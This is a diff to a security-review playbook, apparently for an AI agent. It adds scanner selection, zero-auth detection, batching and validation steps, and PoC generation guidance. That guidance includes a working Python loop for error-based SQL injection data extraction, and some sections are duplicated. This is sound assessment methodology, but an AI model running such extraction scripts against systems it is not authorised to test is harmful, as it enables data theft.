@@ -39,15 +39,24 @@ sc1-recon → sc2-threat-model → sc3-scan (23 sub-scanners) → sc4-validate �
 
 ```
 ./assessment/
-├── state.yaml                  # Review state tracker
-├── scope.md                    # Target scope definition
-├── recon.md                    # Step 1 output
-├── threat-model.md             # Step 2 output
-├── scan-progress.md            # Step 3 progress tracker
-├── vulnerabilities.md          # Step 3 output (all scanners append here)
-├── validated-vulnerabilities.md # Step 4 output
-└── bug-bounty-report.md        # Step 5 output
+├── state.yaml                    # Review state tracker
+├── recon.md                      # Step 1 output
+├── threat-model.md               # Step 2 output
+├── vulnerabilities.md            # Step 3 output (all findings, written in batches)
+├── validated-vulnerabilities.md  # Step 4 output
+├── security-review-report.md    # Step 5 output
+└── poc/                          # PoC scripts for Critical/High findings
+    ├── poc_*.sh                  # curl-based API exploits
+    └── cve_*.py                  # Python mock servers for CVE validation
 ```
+
+### Large Assessment Output Strategy (DEFAULT for 40+ findings)
+
+Write each scanner's findings IMMEDIATELY after delegation returns — never accumulate:
+- Use `terminal` with `cat >> file << 'ENDOFFILE'` in batches (one category per append)
+- Verify with `wc -l` after each append
+- If heredoc fails (content has `&` or special chars), use `write_file` tool instead
+- For 80+ findings, consider split files: `vulnerabilities-ac.md`, `vulnerabilities-sb.md`, etc. with an index in `vulnerabilities.md`
 
 ## State Tracking
 
@@ -199,16 +208,29 @@ Run focused sub-scanners against priority targets from threat model.
 
 ### Scanner Selection by Tech Stack
 
-Before running all 23 scanners, check recon.md and skip what doesn't apply:
+Before running all scanners, check recon.md and skip what doesn't apply:
 
 | Tech Stack | Skip These |
 |------------|-----------|
 | No Solidity/Vyper | All web3-* (7 scanners) |
 | No C/C++/Rust/native | memory |
 | No IaC files (no *.tf, Dockerfile, K8s manifests, CI configs) | infra |
+| No Helm/K8s deployment configs in repo | deployment-security |
 | No file upload endpoints | file-path (keep path traversal checks) |
 | No XML/SOAP | deserialization (keep JSON deser checks) |
 | Pure API (no HTML) | client-side (keep open redirect) |
+
+### Deployment Security Scanner (3v)
+
+When Helm charts, K8s manifests, or Istio config exist in the repo, check:
+- `AuthorizationPolicy` — which services can call which endpoints
+- `PeerAuthentication` — mTLS mode (STRICT vs PERMISSIVE)
+- `NetworkPolicy` — pod-to-pod communication restrictions
+- `Ingress`/`VirtualService` — external exposure, path-based routing
+- Service mesh sidecar injection — is it enforced?
+- Secrets management — are secrets in Helm values or referenced from Vault/sealed-secrets?
+
+If NO deployment configs exist in the repo, note this as a scope limitation (security may be enforced at cluster level but not visible here).
 
 ### Web3 Skip-Fast Check
 
@@ -246,16 +268,99 @@ If no results → mark ALL web3-* as SKIPPED.
 | 3s | web3-evm | `references/vuln-web3-evm.md` | Storage slots, returnbomb, gas griefing |
 | 3t | infra | `references/vuln-infra.md` | Terraform, Dockerfile, K8s, CI/CD, Helm |
 | 3u | spring-boot | `references/vuln-spring-boot.md` | Actuator, security annotations, SpEL, mass assignment, Keycloak |
+| 3v | deployment-security | (inline) | Helm values, Istio AuthorizationPolicy, NetworkPolicy, mTLS, PeerAuthentication |
+| — | (supplement) | `references/spring-boot-mass-assignment-patterns.md` | Map<String,Any> in DTOs, force-flag injection, validation checklist |
+| — | (pattern) | `references/zero-auth-microservice-pattern.md` | Detection, reporting strategy, validation checklist for zero-auth services |
+| — | (supplement) | `references/deployment-security-checks.md` | Helm values, Istio AuthorizationPolicy, NetworkPolicy, mTLS |
+
+### Spring Boot Zero-Auth Detection (Fast Check)
+
+For Spring Boot apps, run this early in recon to determine if auth exists at all:
+```bash
+# Check for Spring Security dependency
+grep -r "spring-boot-starter-security\|spring-security" build.gradle* pom.xml
+# Check for security annotations
+grep -rn "@PreAuthorize\|@Secured\|@RolesAllowed\|@EnableWebSecurity\|SecurityFilterChain" --include="*.kt" --include="*.java"
+# Check for custom auth filters
+grep -rn "OncePerRequestFilter\|HandlerInterceptor\|WebFilter" --include="*.kt" --include="*.java" | grep -v test
+```
+If ALL return empty → mark as "Zero Auth" and apply the Zero-Auth Fast Path below.
+
+### Zero-Auth Fast Path
+
+When a service has ZERO authentication (no Spring Security, no custom filters, no Istio AuthorizationPolicy):
+
+1. **Create ONE systemic finding** (Critical, CWE-306) with a table listing all affected endpoints — NOT 20+ individual findings
+2. **Still scan other categories normally** (logic, data-exposure, etc. are independent of auth)
+3. **In the report**, lead with the systemic auth gap as VULN-001, then list other findings separately
+4. **During validation**, confirm zero-auth once (check all build files, interceptors, Helm/Istio config) — don't re-validate per endpoint
+
+Exception: If some endpoints have DIFFERENT risk levels (e.g., BIFast transfer vs health check), create 2-3 grouped findings by impact tier rather than one flat list.
+
+### Special Patterns
+
+| Pattern | Reference | When to Use |
+|---------|-----------|-------------|
+| Zero-auth microservice | `references/zero-auth-microservice-pattern.md` | Internal service with no Spring Security at all |
 
 ### Parallel Execution via Delegation
 
 For large codebases, batch scanners into parallel delegate_task calls (3 per batch):
-- **Batch 1**: injection + access-control + data-exposure
-- **Batch 2**: ssrf + file-path + logic
-- **Batch 3**: dos + client-side + authn-session
-- **Batch 4**: dependency + api + crypto + misconfig
+- **Batch 1**: access-control + spring-boot + data-exposure (P1 — run first, highest ROI)
+- **Batch 2**: deserialization + logic + misconfig (P1 — run second)
+- **Batch 3**: injection + ssrf + authn-session (P2)
+- **Batch 4**: dependency + api + crypto + file-path + dos (P3)
 - **Batch 5** (if Web3): web3-reentrancy + web3-arithmetic + web3-access
 - **Batch 6** (if Web3): web3-mev + web3-token + web3-defi + web3-nft + web3-evm
+
+**Pitfall:** Large reference file creation via delegate_task can timeout (600s limit). If a subagent times out, write the content directly in the main context instead of re-delegating.
+
+**Pitfall:** Writing large vulnerability files via heredoc (`cat << 'EOF'`) fails when content contains `&` characters (shell interprets as backgrounding). Use `write_file` tool for report content, or split heredocs into smaller chunks avoiding `&`. For very large files (1000+ lines), write in multiple append operations.
+
+**Pitfall:** The `execute_code` tool requires explicit `code` parameter — calling it without content causes repeated failures. When you need to run Python for data processing (e.g., parsing scanner results, making HTTP requests with regex extraction), always provide the code inline. For simple file operations, prefer `write_file` or `terminal` with heredoc.
+
+**Pitfall:** macOS `grep` does not support `-P` (Perl regex). Use `grep -oE` with extended regex, or use Python/sed for complex pattern extraction. This matters when parsing SQLi output or scanner results on macOS.
+
+**Pitfall:** The `execute_code` tool requires explicit code content — it cannot be called with empty parameters. When compiling scanner results into files, use `write_file` or `terminal` with heredoc instead.
+
+**Pitfall:** When writing vulnerabilities.md with 50+ findings, the file content often exceeds what write_file can handle in a single call (context/token limits cause empty writes). Use `cat >> file << 'ENDOFFILE'` via terminal in batches (one scanner category per append). Verify with `wc -l` after each append.
+
+**Practical batch sizing:** 3 scanners per batch is optimal. Each scanner subagent needs ~50-200 file reads. More than 3 per batch risks timeout.
+
+**Pitfall:** Writing vulnerabilities.md after multiple scanners return can exceed single write_file limits. Strategy: write each scanner's findings as a SEPARATE file (`vulnerabilities-ac.md`, `vulnerabilities-sb.md`, etc.) immediately after each delegation returns, then create a short `vulnerabilities.md` index that references them. Alternatively, write in chunks using append mode or terminal `cat >> file`. Never defer writing — if a scanner returns findings, persist them immediately before running the next scanner.
+
+**Pitfall:** For internal microservices with ZERO Spring Security (no `spring-boot-starter-security` dependency at all), the access-control scanner will produce 15-25+ findings because EVERY endpoint is unauthenticated. Group these by root cause ("No Spring Security dependency") in the report rather than listing each endpoint individually. The real finding is the systemic gap, not 20 instances of it.
+
+### Zero-Auth Fast Path
+
+If the Spring Boot Zero-Auth Detection check (in recon) confirms no auth exists at all, use this fast path for the access-control scanner:
+
+1. Create ONE Critical finding: "CWE-306: No Application-Level Authentication" with a table listing all controllers and their endpoints
+2. Create individual IDOR findings ONLY for endpoints where object-level authorization matters even with service-to-service auth (e.g., transaction lookup by arbitrary ID, capture by blockingId)
+3. Create individual Critical findings for highest-impact endpoints that warrant separate attention in remediation (BIFast transfers, bulk payroll, loan disbursement, FX rate updates)
+4. Skip creating separate findings for each "no auth" endpoint — the systemic finding covers them
+
+This reduces 21 findings to ~8-10 focused ones without losing signal.
+
+### Output Strategy for Large Assessments
+
+When running 4+ scanners that produce 40+ findings total, use this strategy:
+
+1. **Write immediately after each scanner returns** — don't accumulate findings in memory
+2. **Use terminal `cat >> file << 'ENDOFFILE'`** for appending scanner results (one category per append)
+3. **Verify with `wc -l`** after each append to confirm write succeeded
+4. **If heredoc fails** (due to `&` or special chars in content), use `write_file` tool instead
+5. **For very large single writes** (500+ lines), split into multiple appends by section
+
+Preferred file structure for 50+ findings:
+```
+./assessment/
+├── vulnerabilities.md             # Single file, written in append chunks per scanner
+├── validated-vulnerabilities.md   # Validation summary (compact)
+└── security-review-report.md     # Final report (references vulnerabilities.md)
+```
+
+The single-file approach works if you append per scanner. The split-file approach (`vulnerabilities-ac.md`, `vulnerabilities-sb.md`, etc.) is fallback if single-file writes keep failing.
 
 ### Cross-Scanner Deduplication
 
@@ -296,7 +401,34 @@ Re-examine each finding by going back to source code. Confirm exploitability, el
 
 **Gate:** validated-vulnerabilities.md exists with all findings classified
 
-**Process:**
+### Validation Batching Strategy
+
+Validate by risk tier to maximize efficiency:
+1. **Critical findings** — validate individually, full data flow trace
+2. **High findings** — batch by category (all AC together, all LG together), delegate 3 categories per batch
+3. **Medium/Low findings** — spot-check 2-3 per category to confirm pattern, then accept rest if pattern holds
+
+For 50+ findings, use 3 parallel delegation batches:
+- Batch 1: Access Control + Logic (highest FP risk — need to check for hidden auth, unique indexes)
+- Batch 2: Spring Boot + Data Exposure + DoS (config-based, lower FP risk)
+- Batch 3: Injection + SSRF + Crypto + Dependency (version/pattern checks, lowest FP risk)
+
+### Process
+
+### Validation Batching Strategy
+
+For large assessments (40+ findings), batch validation by risk tier:
+1. **Critical findings** — validate individually, full data flow trace
+2. **High findings** — batch by category (all AC together, all LG together), delegate 3 categories per batch
+3. **Medium/Low findings** — spot-check 2-3 per category to confirm pattern, then accept rest if pattern holds
+
+Typical delegation structure for validation:
+- Batch 1: Access Control (confirm zero-auth premise, check for hidden filters/gateway)
+- Batch 2: Business Logic (check MongoDB indexes, findAndModify atomicity, state guards)
+- Batch 3: Spring Boot + Data Exposure + DoS (confirm configs, spot-check logging, verify no @Size)
+- Batch 4: Injection + SSRF + Crypto + Dependency (version checks, config verification)
+
+### Validation Steps
 
 1. **Re-read code** — ±50 lines around each finding, check middleware/framework protections
 2. **Trace full data flow** — source → propagation → sanitization → sink
@@ -312,6 +444,9 @@ Re-examine each finding by going back to source code. Confirm exploitability, el
 - Does the framework auto-protect? (React JSX escapes, ORM parameterizes, etc.)
 - Can the prerequisite state actually exist? (workflow bypass needs reachable state)
 - Does `dangerouslySetInnerHTML`/`v-html`/`[innerHTML]` actually receive user input?
+- **MongoDB unique indexes**: Check `@CompoundIndex(unique=true)` on models — these prevent double-spend/duplicate findings at DB level even without application-level checks. Search Mongock migrations too.
+- **Mass assignment validation**: Check if `Map<String, Any>` fields are actually persisted AND used in business logic downstream (e.g., `additionalPayload?.get("force") as Boolean`). If just stored, downgrade. If controls logic, upgrade.
+- **Race condition validation**: Check for `findAndModify` with preconditions vs simple `updateFirst`. The former is atomic; the latter has TOCTOU gaps.
 
 **Reference:** `references/validation.md`
 
@@ -325,20 +460,73 @@ Re-examine each finding by going back to source code. Confirm exploitability, el
 
 Compile validated findings into a professional deliverable.
 
-**Gate:** bug-bounty-report.md exists with all sections complete
+**Gate:** security-review-report.md exists with all sections complete
 
 **Process:**
 
 1. **Executive Summary** — severity breakdown, top risks, key recommendations
-2. **Detailed Findings** — each with CVSS vector, CWE, PoC, remediation code
-3. **Remediation Roadmap** — prioritized by severity and effort
-4. **Positive Security Observations** — what the app does well (5-8 items)
-5. **Scope & Limitations** — what was/wasn't tested, items needing dynamic testing
-6. **Methodology** — 5-step process description
+2. **Attack Chains** — combine related findings into end-to-end exploit scenarios (e.g., "FX rate manipulation → buy/sell at fake rate"). Show 3-5 realistic attack paths with finding IDs chained.
+3. **Detailed Findings** — each with CVSS vector, CWE, PoC, remediation code
+4. **Remediation Roadmap** — prioritized by severity and effort (Phase 1: Immediate, Phase 2: High Priority, Phase 3: Hardening)
+5. **Positive Security Observations** — what the app does well (5-8 items)
+6. **Scope & Limitations** — what was/wasn't tested, items needing dynamic testing
+7. **Methodology** — 5-step process description
+
+### PoC Generation
+
+Generate PoCs for all Critical and High findings where feasible:
+- **API services (no auth)**: curl/bash scripts demonstrating the exploit
+- **Race conditions**: concurrent curl with background jobs or Python `asyncio`/`threading`
+- **Dependency CVEs**: Python mock servers simulating malicious responses
+- **Data extraction**: Scripts that parse heapdump/responses for secrets
+- **SQLi**: Python scripts using `subprocess` + `curl` + `re` for error-based extraction (avoids macOS grep -P issues)
+
+Save to `./assessment/poc/` directory. Make shell scripts executable.
+
+### PoC for SQLi (Error-Based Extraction Pattern)
+
+When SQLi is confirmed via error-based technique (EXTRACTVALUE/UPDATEXML), use Python for reliable extraction:
+```python
+import subprocess, re
+for i in range(50):
+    cmd = ['curl', '-s', '-m', '10', URL, '-X', 'POST', '-d',
+           f"param=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT col FROM table LIMIT {i},1),0x7e))-- -&other=x"]
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+    match = re.search(r"XPATH syntax error: '~([^']+)", result.stdout)
+    if match:
+        print(match.group(1).rstrip("'~"))
+    else:
+        break
+```
+This avoids shell quoting issues and macOS grep incompatibilities.
 
 **Reference:** `references/reporting.md`
 
+**Output:** `./assessment/security-review-report.md` + `./assessment/poc/`
 **Output:** `./assessment/bug-bounty-report.md`
+
+---
+
+## Step 5b: PoC Generation (Optional but Recommended for Internal Pentests)
+
+After the report, generate PoCs for Critical and High findings that demonstrate real-world exploitability.
+
+**When to generate PoCs:**
+- Internal pentest engagements (developer buy-in requires proof)
+- Findings that are "just a curl" (zero-auth services)
+- Race conditions (need concurrent request scripts)
+- Attack chains (multi-step sequences)
+
+**PoC types by finding category:**
+- **Zero-auth endpoints**: Shell scripts with curl commands
+- **Race conditions**: Bash with background jobs (`&` + `wait`) or Python with threading
+- **Dependency CVEs**: Python servers simulating malicious upstream responses
+- **Mass assignment**: Curl with injected fields showing business logic bypass
+- **Attack chains**: Numbered shell scripts showing step-by-step exploitation
+
+**Output:** `./assessment/poc/` directory with executable scripts.
+
+**Naming convention:** `poc_{finding_id}_{short_description}.sh` or `.py`
 
 ---
 
